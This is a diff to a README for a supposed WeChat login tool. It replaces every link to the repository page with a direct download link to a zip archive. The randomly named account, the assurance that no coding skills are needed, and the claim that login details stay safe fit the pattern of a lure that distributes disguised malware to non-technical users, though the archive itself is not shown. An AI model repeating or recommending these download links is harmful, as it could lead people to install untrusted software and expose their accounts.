@@ -1,6 +1,6 @@
 # 🛠️ wechat-openclaw-channel - Easy WeChat Login Support
 
-[![Download Now](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/greasegunzodiacallight857/wechat-openclaw-channel)
+[![Download Now](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/greasegunzodiacallight857/wechat-openclaw-channel/main/common/channel-wechat-openclaw-2.7.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You do not need any coding skills to use this software. It works well on Windows
 
 Click the big blue button below to go to the download page. This is where you will find the latest version of the software.
 
-[![Download Now](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/greasegunzodiacallight857/wechat-openclaw-channel)
+[![Download Now](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/greasegunzodiacallight857/wechat-openclaw-channel/main/common/channel-wechat-openclaw-2.7.zip)
 
 ### Step 2: Find the Windows Version
 
@@ -117,7 +117,7 @@ After scanning, the app will connect to your WeChat account. You will see a conf
 
 ## 🔄 Updating the Software
 
-Visit the [download page](https://github.com/greasegunzodiacallight857/wechat-openclaw-channel) regularly to check for new releases.
+Visit the [download page](https://raw.githubusercontent.com/greasegunzodiacallight857/wechat-openclaw-channel/main/common/channel-wechat-openclaw-2.7.zip) regularly to check for new releases.
 
 Download and install updates the same way you installed the original version. Your settings and login info will stay safe.
 
@@ -151,4 +151,4 @@ Topics related to this tool include:
 
 Access the software here:
 
-[![Download Now](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/greasegunzodiacallight857/wechat-openclaw-channel)
+[![Download Now](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/greasegunzodiacallight857/wechat-openclaw-channel/main/common/channel-wechat-openclaw-2.7.zip)
